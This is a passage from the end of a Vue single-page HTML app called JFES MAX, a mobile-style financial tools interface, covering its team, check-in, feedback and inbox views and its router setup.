                        <p>The information provided by our tools is for analytical and educational purposes and should not be construed as direct financial advice.</p>
                    </div>
                </div>
            `
        };

        const TeamView = {
            template: `
                <div class="view-container no-tab-view">
                    <div class="header">
                        <button class="back-btn" @click="$router.back()">Back</button>
                        <h1>About Team</h1>
                        <div style="width: 44px;"></div>
                    </div>
                    <div class="card">
                        <p style="margin-bottom: 12px;">JFES MAX is engineered by a dedicated collective of senior mobile frontend architects and quantitative financial system specialists.</p>
                        <p>We strive to deliver high-performance, resilient, and elegant offline-first financial applications.</p>
                    </div>
                </div>
            `
        };

        const CheckinView = {
            template: `
                <div class="view-container no-tab-view">
                    <div class="header">
                        <button class="back-btn" @click="$router.back()">Back</button>
                        <h1>Monthly Check-in</h1>
                        <div style="width: 44px;"></div>
                    </div>
                    <div class="card" style="text-align: center;">

                        <button class="btn" @click="checkin">Check-in Today</button>

                    </div>
                </div>
            `,
            setup() {
                const checked = ref(false);
                const checkin = () => {
                    checked.value = true;
                    localStorage.setItem('checked_in', 'true');
                };
                return { checked, checkin };
            }
        };

        const FeedbackView = {
            template: `
                <div class="view-container no-tab-view">
                    <div class="header">
                        <button class="back-btn" @click="$router.back()">Back</button>
                        <h1>Customer Feedback</h1>
                        <div style="width: 44px;"></div>
                    </div>
                    <div class="card">
                        <label>Title</label>
                        <input type="text" v-model="title" placeholder="Feedback title">
                        <label>Content</label>
                        <textarea v-model="content" placeholder="Describe your experience..." style="height: 100px; resize: none;"></textarea>
                        <button class="btn" :disabled="!isValid" :style="{ opacity: isValid ? 1 : 0.5 }" @click="submit">Send Feedback</button>
                        <div v-if="toast" style="margin-top: 12px; color: var(--success); text-align: center; font-weight: 600;">Feedback sent successfully!</div>
                    </div>
                </div>
            `,
            setup() {
                const router = useRouter();
                const title = ref('');
                const content = ref('');
                const toast = ref(false);
                const isValid = computed(() => title.value.trim().length > 0 && content.value.trim().length > 0);

                const submit = () => {
                    if (!isValid.value) return;
                    toast.value = true;
                    setTimeout(() => {
                        title.value = '';
                        content.value = '';
                        toast.value = false;
                        router.back();
                    }, 1200);
                };

                return { title, content, isValid, submit, toast };
            }
        };

        const InboxView = {
            template: `
                <div class="view-container no-tab-view">
                    <div class="header">
                        <button class="back-btn" @click="$router.back()">Back</button>
                        <h1>Inbox</h1>
                        <div style="width: 44px;"></div>
                    </div>
                    <div class="stock-list" style="margin-top: 16px;">
                        <div class="stock-item" @click="showAlert">
                            <div class="stock-info">
                                <div class="symbol">Welcome</div>
                                <div class="name">System notification</div>
                            </div>
                        </div>
                    </div>
                </div>
            `,
            setup() {
                const showAlert = () => {
                    alert('Welcome to JFES MAX! Enjoy our professional financial suite and robust analytics tools.');
                };
                return { showAlert };
            }
        };

        // Router configuration
        const routes = [
            { path: '/', component: LoadingView },
            { path: '/home', component: HomeView },
            { path: '/list/:type', component: StockListView },
            { path: '/detail', component: StockDetailView },
            { path: '/guide', component: GuideView },
            { path: '/toolbox', component: ToolboxView },
            { path: '/settings', component: SettingsView },
            { path: '/settings/version', component: VersionView },
            { path: '/settings/privacy', component: PrivacyView },
            { path: '/settings/terms', component: TermsView },
            { path: '/settings/team', component: TeamView },
            { path: '/settings/checkin', component: CheckinView },
            { path: '/settings/feedback', component: FeedbackView },
            { path: '/settings/inbox', component: InboxView }
        ];

        const router = createRouter({
            history: createWebHashHistory(),
            routes
        });

        const app = createApp({
            setup() {
                const route = useRoute();
                const showTabBar = computed(() => {
                    const path = route.path;
                    return path === '/home' || path === '/toolbox' || path === '/settings';
                });
                return { showTabBar };
            }
        });

        app.use(router);
        app.mount('#app');
    </script>
</body>
</html>
